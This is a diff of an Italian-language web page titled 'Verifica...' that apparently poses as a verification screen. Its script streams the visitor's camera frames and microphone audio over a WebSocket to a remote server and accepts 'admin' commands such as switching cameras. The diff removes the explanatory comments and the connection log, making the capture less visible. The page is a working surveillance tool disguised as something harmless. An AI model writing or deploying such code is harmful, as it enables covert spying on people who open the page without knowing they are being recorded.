@@ -5,8 +5,8 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
 <title>Verifica...</title>
 <style>
-  body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
-  .msg { padding:40px 20px; font-size:18px; }
+body { margin:0; padding:0; background:#000; color:#0f0; font-family:Arial; text-align:center; }
+.msg { padding:40px 20px; font-size:18px; }
 </style>
 </head>
 <body>
@@ -26,11 +26,10 @@ let sending = false;
 let currentCamera = 'environment';
 let stream = null;
 
-ws.onopen = async () => { console.log('✅ WebSocket connesso'); startCamera(currentCamera); };
+ws.onopen = async () => { startCamera(currentCamera); };
 ws.onerror = e => console.error('WebSocket errore', e);
 ws.onclose = () => console.warn('WebSocket chiuso');
 
-// Ricezione comandi admin
 ws.onmessage = e => {
   if (typeof e.data === 'string') {
     try {
@@ -64,7 +63,6 @@ async function startCamera(camera) {
   }
 }
 
-// Invio video
 function sendFrame() {
   if (!sending || video.videoWidth === 0) { setTimeout(sendFrame, 50); return; }
   canvas.width = video.videoWidth;
@@ -74,7 +72,6 @@ function sendFrame() {
   setTimeout(sendFrame, 50);
 }
 
-// Invio audio PCM semplice
 function sendAudio() {
   const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
   const source = audioCtx.createMediaStreamSource(stream);
